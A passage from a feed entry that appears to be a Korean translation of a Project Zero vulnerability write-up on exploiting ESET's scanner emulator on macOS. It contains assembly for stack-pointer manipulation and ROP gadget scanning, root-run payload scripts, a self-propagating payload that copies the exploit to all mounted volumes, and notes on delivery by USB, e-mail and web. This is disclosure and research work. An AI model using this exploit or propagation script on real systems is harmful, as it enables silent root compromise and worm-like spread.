<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span> <span class="mi">124</span> <span class="o">-</span> <span class="p">(((</span><span class="mi">4U</span> <span class="o">-</span> <span class="p">(</span><span class="mi">123</span> <span class="o">%</span> <span class="mi">4</span><span class="p">))</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span>
<span class="err">$</span><span class="mi">6</span> <span class="o">=</span> <span class="mi">123</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span></code></pre></div></p>

<p>이 요소를 PUSH/POP과 조합하면 스택의 임의 인덱스와 상호작용할 수 있다. Figure 4는 x86 코드를 이용, 에뮬레이터 내부에서 어떻게 임의의 스택 인덱스에 접근할 수 있는지 설명하는 코드이다.</p>

<p><div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nl">accessframe:</span>
    <span class="c1">;</span>
    <span class="c1">; Retrieve information from our stack frame.</span>
    <span class="c1">;</span>
    <span class="c1">; EDI   Real return address</span>
    <span class="c1">; ESI   Real base pointer</span>
    <span class="c1">;</span>
    <span class="c1">;</span>
    <span class="c1">; The stack frame looks like this:</span>
    <span class="c1">;</span>
    <span class="c1">;   -00000030 ShadowStack     dd 10 dup(?)</span>
    <span class="c1">;   -00000008 ModifyCount     dd ?</span>
    <span class="c1">;   -00000004 CycleCount      dd ?</span>
    <span class="c1">;   +00000000  s              db 4 dup(?)</span>
    <span class="c1">;   +00000004  r              db 4 dup(?)</span>
    <span class="c1">;   +00000008 EmulatorObject  dd ?</span>
    <span class="c1">;</span>
    <span class="c1">; So s is 30h + 8 + 4 bytes from the base of ShadowStack. Because the</span>
    <span class="c1">; ShadowStackPointer is an index into an array of DWORDS, we need to set it</span>
    <span class="c1">; to (30h + 8 + 4) / 4 = 15.</span>
    <span class="c1">;</span>
    <span class="c1">; Then we can load s (saved register), and r (return address)</span>
    <span class="c1">; onto virtual registers. To calculate the value of real EBP, we take the</span>
    <span class="c1">; previous frame&amp;rsquo;s sp and subtract our frame size.&lt;/p&gt;</span>

<span class="err">&lt;</span><span class="nf">pre</span><span class="o">&gt;&lt;</span><span class="nv">code</span><span class="o">&gt;</span><span class="c1">; We need to move the shadow stack pointer back in five stages.</span>
<span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="kt">byte</span> <span class="o">-</span><span class="p">(</span><span class="mi">4</span> <span class="o">&amp;</span><span class="nv">lt</span><span class="c1">;&amp;lt; 2)     ; SSP=0xC0000004</span>
<span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="kt">byte</span> <span class="o">-</span><span class="p">(</span><span class="mi">4</span> <span class="o">&amp;</span><span class="nv">lt</span><span class="c1">;&amp;lt; 2)     ; SSP=0x80000008</span>
<span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="kt">byte</span> <span class="o">-</span><span class="p">(</span><span class="mi">4</span> <span class="o">&amp;</span><span class="nv">lt</span><span class="c1">;&amp;lt; 2)     ; SSP=0x4000000C</span>
<span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="kt">byte</span> <span class="o">-</span><span class="p">(</span><span class="mi">4</span> <span class="o">&amp;</span><span class="nv">lt</span><span class="c1">;&amp;lt; 2)     ; SSP=0x00000010</span>
<span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="kt">byte</span>  <span class="p">(</span><span class="mi">1</span> <span class="o">&amp;</span><span class="nv">lt</span><span class="c1">;&amp;lt; 2)     ; SSP=0x0000000F</span>
<span class="nf">pop</span>     <span class="nb">esi</span>                     <span class="c1">; Load the real previous frame&#39;s sp.</span>
<span class="nf">pop</span>     <span class="nb">edi</span>                     <span class="c1">; Load the return address.</span>
<span class="nf">sub</span>     <span class="nb">esi</span><span class="p">,</span> <span class="kt">byte</span> <span class="mh">0x5C</span>          <span class="c1">; Adjust ESI to point to our real stack frame.</span>
<span class="err">&lt;/</span><span class="nf">code</span><span class="o">&gt;&lt;/</span><span class="nv">pre</span><span class="o">&gt;</span>

<span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span></code></pre></div></p>

<p>우리는 이제 스택 베이스 주소로부터의 오프셋을 계산해냄으로써 섀도우 스택 포인터가 임의의 메모리 주소를 가리키도록 할 수 있다. 만약 섀도우 스택 포인터가 .text 영역을 가리키게 한다면, 메모리 주소 공간을 스캔해서 gadget들을 찾아 DEP를 우회할 수 있다.</p>

<p>맥OS의 경우, gadget을 통해 실행 흐름을 쉘코드로 변경해주는만으로 충분하다. 이것은 ESET가 MH_NO_HEAP_EXECUTION 플래그를 Mach 헤더에 설정하지 않음으로써 DEP를 비활성화시키기 때문이다. 윈도우와 리눅스는 완전한 ROP 체인이 필요하다.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>otool -hv /Applications/ESET<span class="se">\ </span>Cyber<span class="se">\ </span>Security<span class="se">\ </span>Pro.app/Contents/MacOS/esets_daemon
/Applications/ESET Cyber Security Pro.app/Contents/MacOS/esets_daemon:
Mach header
      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
   MH_MAGIC    I386        ALL  0x00     EXECUTE    <span class="m">27</span>       <span class="m">3184</span>   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE</code></pre></div></p>

<p>만약 복잡한 gadget 체인 때문에 사이클이 더 필요하다면, 첫단계 gadget 체인을 통해 사이클 카운트를 초기화하여 익스플로잇 완성을 위한 무제한의 시간을 얻을 수 있다.</p>

<p><div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nl">findgadget:</span>
    <span class="c1">;</span>
    <span class="c1">; Search for simple gadget at [ESP] using stack operations.</span>
    <span class="c1">;</span>
    <span class="c1">; EDI       Current search location for gadget.</span>
    <span class="c1">; EAX       Last DWORD read from [EDI].</span>
    <span class="c1">;  BL       Byte from [EDI-1].</span>
    <span class="c1">; ECX       Byte index into current DWORD</span>
    <span class="c1">; EBP       Constant Mask</span>
    <span class="c1">; EDX       Constant 4</span>
    <span class="c1">;</span>
    <span class="c1">; This loop uses a modified port of Algorithm 6-2 (Find leftmost 0-byte)</span>
    <span class="c1">; from &amp;ldquo;Hackers Delight&amp;rdquo; by Henry Warren, ISBN 0-201-91465-4. The</span>
    <span class="c1">; .nextdword loop is where we burn all our cycles, so optimizing for the</span>
    <span class="c1">; common case doubles our search space.</span>
    <span class="c1">;</span>
    <span class="no">ReqOpcode</span><span class="kd">   equ</span> <span class="mh">0xFF</span>    <span class="c1">; register indirect branch</span>
    <span class="no">ReqOperands</span><span class="kd"> equ</span> <span class="mh">0x13112321</span>
    <span class="nf">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; initialize loop counter</span>
    <span class="nf">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="mh">0x7F7F7F7F</span> <span class="c1">; initialize mask</span>
    <span class="nf">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mi">4</span>          <span class="c1">; constant</span>
    <span class="nf">pop</span>     <span class="nb">ebx</span>             <span class="c1">; initialize BL</span>
    <span class="nf">bswap</span>   <span class="nb">ebx</span>             <span class="c1">; rearrange so high byte is in bl</span>
    <span class="nf">dec</span>     <span class="nb">edi</span>             <span class="c1">; adjust for start of search</span>
   <span class="nl">.nextdword:</span>
    <span class="nf">pop</span>     <span class="nb">eax</span>             <span class="c1">; fetch another dword to examine</span>
    <span class="nf">bswap</span>   <span class="nb">eax</span>             <span class="c1">; reorder bytes</span>
    <span class="nf">not</span>     <span class="nb">eax</span>             <span class="c1">; invert bits because this code searches for 0x00</span>
    <span class="nf">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; ecx is a copy of dword to scan we can modify</span>
    <span class="nf">and</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebp</span>        <span class="c1">; y &amp;amp; 0x7f7f7f7f</span>
    <span class="nf">add</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebp</span>        <span class="c1">; + 0x7f7f7f7f</span>
    <span class="nf">or</span>      <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; y | x</span>
    <span class="nf">or</span>      <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebp</span>        <span class="c1">; y | mask</span>
    <span class="nf">not</span>     <span class="nb">eax</span>             <span class="c1">; restore bits, we need them in either case</span>
    <span class="nf">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="kt">byte</span> <span class="o">~</span><span class="mi">0</span>    <span class="c1">; ~y; xor instead of not because ZF</span>
    <span class="nf">jnz</span>     <span class="nv">.matchfound</span>     <span class="c1">; was there a 0xFF?</span>
   <span class="nl">.nomatch:</span>
    <span class="nf">sub</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; adjust current search pointer</span>
    <span class="nf">mov</span>     <span class="nb">bl</span><span class="p">,</span> <span class="nb">al</span>          <span class="c1">; save byte for operand match</span>
    <span class="nf">jmp</span>     <span class="nv">short</span> <span class="nv">.nextdword</span><span class="c1">; next dword</span></code></pre></div>
Figure 5. ASLR/DEP 우회 및 마이너 버전에서의 변화 허용을 위한 call [reg] gadget을 찾는다. 에뮬레이터에서 리턴하는 경우, [ECX]는 스캔이 되고 있는 파일의 시작 지점을 가리키고 있을 것이다. 이 의미는 스캔중인 악성코드의 코드를 실제 CPU에서 재실행한다는 뜻이다.</p>

<p>Figure 5는 POP 명령어를 통해 메모리 주소 공간을 탐색하는것을 보여준다. 이것은 매우 자원이 많이드는 비싼 동작이기 때문에 시퀀스는 보통의 경우 싸이클수를 줄일 수 있도록 최적화되어 있다. 만약 좋은 후보를 발견할 경우, 리턴주소를 덮어쓰고 에뮬레이터를 종료한다.</p>

<h3>익스플로잇 가능성 테스트</h3>

<p>분석을 돕기위해 삽입된 스크립트를 실행하는 샘플 익스플로잇을 보고서와 함께 제공하며, 이는 아래 링크에서 다운로드 가능하다.</p>

<p><a href="https://code.google.com/p/google-security-research/issues/detail?id=456">https://code.google.com/p/google-security-research/issues/detail?id=456</a></p>

<p>첨부한 익스플로잇을 빌드하고 테스트하려면, 실수로 시스템이 익스플로잇 되는것을 방지하기 위해 우선 실시간 파일시스템 검색 기능을 비활성화시켜야 한다. 익스플로잇을 빌드하기 위해서는 애플에서 배포하는 XCode 커맨드라인 툴 패키지가 설치되어 있어야 한다. 만약 해당 패키지가 설치되어어있지 않다면, 커맨드라인에 make를 입력할 시 자동으로 패키지 설치 안내 메시지가 출력될 것이다.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>ls -l
total 28K
-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>- <span class="m">1</span> taviso eng 17K Jun <span class="m">18</span> 12:45 esetemu.asm
-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>- <span class="m">1</span> taviso eng <span class="m">605</span> Jun <span class="m">18</span> 10:31 Makefile
-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>- <span class="m">1</span> taviso eng <span class="m">514</span> Jun <span class="m">18</span> 15:58 payload.sh</code></pre></div></p>

<p>payload.sh 파일은 익스플로잇에 삽입되어 있고, 익스플로잇이 성공했을 경우 실행된다.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>cat payload.sh&lt;/p&gt;

&lt;h1&gt;!/bin/sh&lt;/h1&gt;

&lt;p&gt;#&lt;/p&gt;

&lt;h1&gt;This is the payload code run as root in the context of esets_daemon after&lt;/h1&gt;

&lt;h1&gt;successful exploitation.&lt;/h1&gt;

&lt;p&gt;#
osascript -e <span class="p">&amp;</span>lsquo<span class="p">;</span>tell application <span class="p">&amp;</span>ldquo<span class="p">;</span>Finder<span class="p">&amp;</span>rdquo<span class="p">;</span> to <span class="nb">set </span>desktop picture to POSIX file <span class="p">&amp;</span>ldquo<span class="p">;</span>/usr/share/httpd/icons/bomb.png<span class="p">&amp;</span>rdquo<span class="p">;&amp;</span>rsquo<span class="p">;</span>
/Applications/Calculator.app/Contents/MacOS/Calculator <span class="p">&amp;</span>amp<span class="p">;</span>
<span class="nb">echo </span>w00t
uname -a<span class="p">;</span> date<span class="p">;</span> id</code></pre></div></p>

<p>make를 실행하며 익스플로잇을 빌드하면 되고, esetemu.bin 파일에는 결과가 저장된다. 파일 확장자는 취약점에 중요하지않으며, 심지어 .txt도 가능하다.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>make
gzip -9c <span class="p">&amp;</span>lt<span class="p">;</span> payload.sh <span class="p">|</span> base64 <span class="p">|</span> tr -d <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\n</span><span class="p">&amp;</span>rsquo<span class="p">;</span> &gt;&gt; payload.inc
nasm -O0 -f bin -D&lt;strong&gt;MACOS&lt;/strong&gt; -o esetemu.bin esetemu.asm</code></pre></div></p>

<p>익스플로잇을 테스트하기 위해서는, ESET 설치로부터 esets_scan 유틸리티를 사용해야 한다. 자신의 사용자 계정으로 실행되며, 만약 뭔가 잘못된다면 크래시나 스크립트의 문법 에러 등을 통해 눈치챌 수 있다.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>/Applications/ESET<span class="se">\ </span>Cyber<span class="se">\ </span>Security<span class="se">\ </span>Pro.app/Contents/MacOS/esets_scan esetemu.bin&lt;/p&gt;

&lt;p&gt;ESET Command-line scanner, <span class="p">&amp;</span>copy<span class="p">;</span> 1992-2011 ESET, spol. s r.o.
Module loader, version <span class="m">1056</span> <span class="o">(</span>20150113<span class="o">)</span>, build 1082
Module perseus, version <span class="m">1456</span> <span class="o">(</span>20150512<span class="o">)</span>, build 1687
Module scanner, version <span class="m">11810</span> <span class="o">(</span>20150619<span class="o">)</span>, build 24399
Module archiver, version <span class="m">1228</span> <span class="o">(</span>20150528<span class="o">)</span>, build 1230
Module advheur, version <span class="m">1154</span> <span class="o">(</span>20150129<span class="o">)</span>, build 1120
Module cleaner, version <span class="m">1109</span> <span class="o">(</span>20150519<span class="o">)</span>, build 1140&lt;/p&gt;

&lt;p&gt;Command line: esetemu.bin&lt;/p&gt;

&lt;p&gt;Scan started at:   Thu Jun <span class="m">18</span> 21:57:48 2015
w00t
Darwin Macs-Mac.local 13.0.0 Darwin Kernel Version 13.0.0: Thu Sep <span class="m">19</span> 22:22:27 PDT 2013<span class="p">;</span> root:xnu-2422.1.72~6/RELEASE_X86_64 x86_64
Thu Jun <span class="m">18</span> 21:57:48 PDT 2015
<span class="nv">uid</span><span class="o">=</span>501<span class="o">(</span>macuser<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20<span class="o">(</span>staff<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>20<span class="o">(</span>staff<span class="o">)</span>,401<span class="o">(</span>com.apple.sharepoint.group.1<span class="o">)</span>,12<span class="o">(</span>everyone<span class="o">)</span>,61<span class="o">(</span>localaccounts<span class="o">)</span>,79<span class="o">(</span>&lt;em&gt;appserverusr<span class="o">)</span>,80<span class="o">(</span>admin<span class="o">)</span>,81<span class="o">(</span>&lt;/em&gt;appserveradm<span class="o">)</span>,98<span class="o">(</span>&lt;em&gt;lpadmin<span class="o">)</span>,33<span class="o">(</span>&lt;/em&gt;appstore<span class="o">)</span>,100<span class="o">(</span>&lt;em&gt;lpoperator<span class="o">)</span>,204<span class="o">(</span>&lt;/em&gt;developer<span class="o">)</span>,398<span class="o">(</span>com.apple.access_screensharing<span class="o">)</span>,399<span class="o">(</span>com.apple.access_ssh<span class="o">)</span></code></pre></div></p>

<p>라이브 시스템을 대상으로 익스플로잇을 실험해보는 제일 쉬운방법은 실시간 검사기능을 활성화하고 파일을 cat으로 오픈하는 것이다.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>cat esetemu.bin &gt; /dev/null</code></pre></div></p>

<p>만약 익스플로잇이 성공하면, payload.sh가 루트권한으로 실행되었을 것이다. 주의할점은 stdout이나 stderr를 이 모드에서는 볼 수 없기 때문에 만약 원한다면 다른파일로 출력결과를 리다이렉트 시켜야한다. 만약 익스플로잇이 제대로 동작을 한다면, 이메일 첨부파일이나, 브라우저 다운로드, 웹앱 업로드 등으로 테스트 가능하다.</p>

<p>ESET 데몬은 종료처리를 눈에띄지않게 하기때문에 사용자는 익스플로잇이 실행되었는지 알 수가 없다.</p>

<h3>페이로드 예제(Sample Payload)</h3>

<h4>USB &amp; Removable Disk 익스플로잇</h4>

<p>익스플로잇을 .hidden이라고 명명하고 마운트된 볼륨의 루트 디렉토리에 위치시키면(예. /Volumes/MyDrive/.hidden), 디바이스가 삽입될 경우 자동으로 실행된다. ESET CyberSecurity Pro6은 기본설정에서 USB/CD-ROM/DVD 장치를 입력할 경우 알림창을 띄우지만, 어떤 옵션을 선택하더라도(또는 아무 옵션을 선택하지 않더라도) 익스플로잇은 성공적으로 실행된다.</p>

<p>아래와 같이 다른 마운트된 볼륨으로 전파를 시킬 수 있다.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>cat payload.sh&lt;/p&gt;

&lt;h1&gt;!/bin/sh&lt;/h1&gt;

&lt;p&gt;#&lt;/p&gt;

&lt;h1&gt;This is the payload code run as root in the context of esets_daemon after&lt;/h1&gt;

&lt;h1&gt;successful exploitation.&lt;/h1&gt;

&lt;p&gt;#&lt;/p&gt;

&lt;h1&gt;This silly example demonstrates simple propagation.&lt;/h1&gt;

&lt;p&gt;#&lt;/p&gt;

&lt;h1&gt;Discard output&lt;/h1&gt;

&lt;p&gt;exec <span class="p">&amp;</span>amp<span class="p">;</span>&gt; /dev/null&lt;/p&gt;

&lt;h1&gt;Do something malicious.&lt;/h1&gt;

&lt;p&gt;/Applications/Calculator.app/Contents/MacOS/Calculator <span class="p">&amp;</span>amp<span class="p">;</span>&lt;/p&gt;

&lt;h1&gt;Is there an exploit on a Volume?&lt;/h1&gt;

&lt;p&gt;name<span class="o">=</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="k">$(</span>find /Volumes -type f -depth <span class="m">2</span> -name .hidden -size 79911c <span class="p">|</span> head -n 1<span class="k">)</span><span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;

&lt;h1&gt;Yes, propagate to all other disks.&lt;/h1&gt;

&lt;p&gt;test -f <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="k">${</span><span class="nv">name</span><span class="k">}</span><span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> find /Volumes -type d                          <span class="se">\</span>
                                   -depth <span class="m">1</span>                         <span class="se">\</span>
                                   -exec cp -f <span class="p">&amp;</span>ndash<span class="p">;</span> <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="k">${</span><span class="nv">name</span><span class="k">}</span><span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="o">{}</span> <span class="se">\;</span>   <span class="se">\</span>
                                   -exec sleep <span class="m">1</span> <span class="se">\;</span></code></pre></div></p>

<p>이 기술은 사용자와의 상호작용이 없이 ESET가 배포된 망분리된 네트워크를 순회할 수 있게 해준다. 이것은 윈도우 네트워크에서도 가능하며, 간단하게 desktop.ini나 autorun.ini를 대신 사용하면 된다.</p>

<h4>E-Mail 익스플로잇</h4>

<p>익스플로잇을 Mail.app, Outlook 등의 사용자에게 MIME 첨부 형태로 전송하면 사용자와의 상호작용이 전혀 없어 자동으로 익스플로잇이 되는것을 허용한다. 새로운 이메일을 읽거나 열지 않아도 단지 수신하는것만으로 익스플로잇은 동작한다.</p>

<h4>웹 익스플로잇</h4>

<p>익스플로잇은 공격자의 웹사이트에서 호스팅되거나, 신뢰가능한 사이트들에 이미지 형태로 업로드될 수 있다. 또는 HTML5 어플리케이션 캐시, 다운로드, 아니면 단지 text/html 형태로 익스플로잇을 제공하는것으로 충분하다.</p>

<h1>결론</h1>

<p>취약점을 찾고, 분석하고 익스플로잇하는데는 몇일밖에 걸리지 않는 작업이였다. ESET는 우리에게 익스플로잇 방어기술들을 향상시켜 미래에는 익스플로잇이 더 어렵도록 작업하고 있다고 연락이 왔다.</p>

<h1>Acknowledgements</h1>

<p>본 취약점은 구글 프로젝트 제로의 Tavis Ormandy에 의해 발견됨</p>

<h1>Reference</h1>

<ol>
<li><a href="http://googleprojectzero.blogspot.kr/2015/06/analysis-and-exploitation-of-eset.html">http://googleprojectzero.blogspot.kr/2015/06/analysis-and-exploitation-of-eset.html</a></li>
</ol>

]]></content>
  </entry>
  
</feed>
